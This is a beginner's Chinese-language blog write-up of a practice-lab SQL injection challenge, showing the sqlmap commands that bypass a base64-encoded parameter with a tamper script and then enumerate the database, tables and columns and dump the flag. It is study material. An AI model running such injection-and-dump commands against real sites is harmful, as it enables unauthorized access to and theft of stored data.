---
layout: post
title: "sqlmap-learning1"
date: 2019-05-20
author: jjnoob
categories:
- 2019-05
tags:
- sqli
- sqlmap
---

* content
{:toc}


> sqlmap实战体验, 看教程很迷. 实战一次会理解的更好.

> 虽然用linux安装这些工具更合适, 不过这个比较浪费时间. 准备暑假的时候把大部分的工具迁到Linux上去. 我目前还是比较焦急的, 想多学点东西.
> 不太想在细枝末节上面浪费太多时间.
> 仔细想想, 自己的时间已经不多了. web-sec其实上周四(19-05-16)才算刚刚接触, 之前一直在划水摸鱼, 没有深入学习.  
> 还有很多知识点要学, 还有很多工具需要学习怎么使用, 还有课堂的学习, 还有beego等框架.


[参考](https://www.cnblogs.com/dzkwwj/p/9484671.html)

练习地址: 墨者学院-->在线靶场-->web安全-->sql注入-->sql注入实战-MySQL

**题目提示的解题方向:**
参数通过base64编码后传输，然后根据相关提示进行测试

<br />

# 测试注入
测试注入:
```
sqlmap  -u http://219.153.49.228:46768/show.php?id=MQo=
```
结果:
```
[20:34:09] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

> 报错信息可以有道翻译一下, 这么长.

大体意思是: 参数 id 可能不存在注入，可以尝试增加尝试等级（level），或者增加执行测试的风险（risk）。如果你觉得存在某种保护机制，可以使用tamper篡改注入数据

根据提示信息增加level和tamper：
```
sqlmap  -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode
```

返回:
```
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
```

剩下就是常规脱库操作

<br />

# 脱库
## (1) 查看数据库名
```
sqlmap -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode --current-db
```

返回:
```
current database: 'test'
```

## (2) 查看当前用户
```
sqlmap -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode --current-user
```

返回:
```
current user: 'admin@%'
```


## (3) 查看表
查看数据库test中有哪些表:
```
sqlmap -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode -D test --tables
```

返回:
```
Database: test
[1 table]
+------+
| data |
+------+
```

## (4) 查看列
查看data表中有几列:
```
sqlmap -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode -D test -T data --columns
```

返回:
```
Database: test
Table: data
[4 columns]
+--------+------------------+
| Column | Type             |
+--------+------------------+
| id     | int(10) unsigned |
| main   | text             |
| thekey | varchar(255)     |
| title  | varchar(255)     |
+--------+------------------+
```

thekey这个列..

## (5) 最后一步
```
sqlmap -u http://219.153.49.228:46768/show.php?id=MQo= --level=3 --tamper=base64encode -D test --tables -C thekey --dump
```

返回:
```
mozhec42eae6ac2490f9fa58b828f58d
Database: test
Table: data
[1 entry]
+----------------------------------+
| thekey                           |
+----------------------------------+
| mozhec42eae6ac2490f9fa58b828f58d |
+----------------------------------+
```

key:
```
mozhec42eae6ac2490f9fa58b828f58d
```

等待时间有点长, 耐心等待就好.
